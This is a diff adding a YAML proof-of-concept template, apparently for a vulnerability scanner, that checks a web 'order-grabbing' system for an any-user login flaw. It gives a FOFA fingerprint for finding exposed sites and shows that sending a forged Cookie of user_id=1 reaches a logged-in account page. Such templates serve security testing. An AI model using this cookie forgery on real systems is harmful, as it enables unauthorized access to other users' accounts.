@@ -1,0 +1,19 @@
+id: poc-yaml-grab-orders-shua-orders-any-user-login
+info:
+  name: 海外抢单Shua单系统 任意用户登录漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 海外抢单Shua单系统
+  fofa: body="/red/popper.min.js"
+requests:
+- method: GET
+  path: /index/index
+  expression: status_code == 301
+- method: GET
+  path: /index/index
+  headers:
+    Cookie: user_id=1
+  expression: status_code == 200 && contains(body,"money") && contains(body,"/index/rot_order/index")
+variables: {}
+transport: http
